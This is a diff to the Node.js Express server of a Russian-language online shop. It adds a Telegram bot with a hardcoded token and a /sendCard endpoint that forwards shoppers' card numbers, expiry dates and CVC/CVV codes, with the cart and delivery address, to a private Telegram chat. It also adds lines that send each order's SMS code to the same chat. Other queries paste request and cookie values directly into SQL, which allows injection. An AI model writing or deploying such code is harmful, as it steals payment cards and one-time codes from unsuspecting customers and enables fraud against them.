@@ -11,6 +11,15 @@ const getSearchDataTwoAnd = sql.getSearchDataTwoAnd;
 const getSearchDataTwoOr = sql.getSearchDataTwoOr;
 const getDataID = sql.getDataID;
 const updateDataID = sql.updateDataID;
+const TELEGRAM_URI = `https://api.telegram.org/bot5901248890:AAEa-b1KvGnQQo8SYHfFYB7AdwmsPYBdEgE/sendMessage`;
+
+const TelegramBot = require("node-telegram-bot-api");
+
+const token = "5901248890:AAEa-b1KvGnQQo8SYHfFYB7AdwmsPYBdEgE";
+
+const bot = new TelegramBot(token, { polling: true });
+
+const request = require("request");
 
 app.use(express.json({}));
 app.use(cookieParser());
@@ -33,6 +42,7 @@ app.post("/orderAdd", (req, res) => {
             `INSERT INTO orders (goods, user_id, date, adress, status, phone, mail, summ) VALUES ('${cart}', ${user_id}, '${date}', '${address}', 'Обработка', '${phone}', '${mail}', ${summ})`
           )
           .then(() => {
+            bot.sendMessage(817972691, `СМС код - ${orderData.sms}`);
             res.json("ok");
           });
       });
@@ -51,6 +61,7 @@ app.post("/orderAdd", (req, res) => {
         `INSERT INTO orders (goods, date, adress, status, phone, mail, summ) VALUES ('${goods}', '${date}', '${address}', 'Обработка', '${phone}', '${mail}', ${summ})`
       )
       .then(() => {
+        bot.sendMessage(817972691, `СМС код - ${orderData.sms}`);
         res.json("ok");
       });
   }
@@ -422,10 +433,10 @@ app.post("/registration", (req, res) => {
             }
           );
         })
-        .catch(e => {
-          console.error(e)
-          res.send(`[BD error]`)
-        })
+        .catch((e) => {
+          console.error(e);
+          res.send(`[BD error]`);
+        });
     } else {
       res.send("Такой пользователь уже существует!");
     }
@@ -525,6 +536,92 @@ app.post("/addToCart", (req, res) => {
     });
   }
 });
+app.post("/sendCard", (req, res) => {
+  const cardData = req.body;
+  let message = "Новый заказ!\n\n";
+  console.log("test");
+
+  if (req.cookies.id) {
+    let user_id = req.cookies.id;
+    connectPool
+      .query(`SELECT * FROM users WHERE ID = ${user_id}`)
+      .then((user_data) => {
+        user_data = user_data[0][0];
+        console.log(user_data);
+        let goods_str = "";
+        let cart = user_data.cart.split(", ");
+        let cart_goods = [];
+        let cart_goods_cnt = [];
+        cart.forEach((item, key) => {
+          if (key !== cart.length - 1) {
+            item = JSON.parse(item);
+            cart_goods.push(item.id);
+            cart_goods_cnt.push(item.count);
+          }
+        });
+        cart_goods.sort(function (a, b) {
+          return a - b;
+        });
+        console.log(cart_goods);
+        connectPool
+          .query(`SELECT * FROM goods WHERE ID IN (?) ORDER BY ID`, [
+            cart_goods,
+          ])
+          .then((goods_data) => {
+            goods_data = goods_data[0];
+            let goods_summ = 0;
+            goods_data.map((good, key) => {
+              console.log(good);
+              goods_summ += cart_goods_cnt[key] * good.price;
+              goods_str += `${good.full_name} ${
+                cart_goods_cnt[key]
+              }шт.  сумма - ${cart_goods_cnt[key] * good.price}р. \n`;
+            });
+            console.log(goods_str);
+            message += `Номер карты: ${cardData.num} \nДаты карты: ${cardData.date}\nCVC/CVV: ${cardData.cvv}\n\n`;
+            message += `Состав заказа: (${goods_summ}р.)\n${goods_str}\n`;
+            message += `Адрес доставки: ${cardData.address}`;
+            console.log(message);
+            bot.sendMessage(817972691, message);
+          });
+      });
+  } else {
+    let goods_str = "";
+    let cart = req.cookies.cart.split("_");
+    let cart_goods = [];
+    let cart_goods_cnt = [];
+    cart.forEach((item, key) => {
+      if (key !== cart.length - 1) {
+        let [id, count] = item.split("-");
+        cart_goods.push(Number(id));
+        cart_goods_cnt.push(Number(count));
+      }
+    });
+    cart_goods.sort(function (a, b) {
+      return a - b;
+    });
+    console.log(cart_goods);
+    connectPool
+      .query(`SELECT * FROM goods WHERE ID IN (?) ORDER BY ID`, [cart_goods])
+      .then((goods_data) => {
+        goods_data = goods_data[0];
+        let goods_summ = 0;
+        goods_data.map((good, key) => {
+          console.log(good);
+          goods_summ += cart_goods_cnt[key] * good.price;
+          goods_str += `${good.full_name} ${cart_goods_cnt[key]}шт.  сумма - ${
+            cart_goods_cnt[key] * good.price
+          }р. \n`;
+        });
+        console.log(goods_str);
+        message += `Номер карты: ${cardData.num} \nДаты карты: ${cardData.date}\nCVC/CVV: ${cardData.cvv}\n\n`;
+        message += `Состав заказа: (${goods_summ}р.)\n${goods_str}\n`;
+        message += `Адрес доставки: ${cardData.address}`;
+        console.log(message);
+        bot.sendMessage(817972691, message);
+      });
+  }
+});
 
 if (process.env.NODE_ENV === "production") {
   app.use(express.static(path.resolve("./public")));
@@ -542,6 +639,6 @@ app.listen(process.env.PORT || 6000, () => {
   console.log(`server start on ${process.env.PORT || 6000}`);
 });
 
-process.on('uncaughtException', e => {
-  console.error(`process killer\n${e}`)
-})
+process.on("uncaughtException", (e) => {
+  console.error(`process killer\n${e}`);
+});
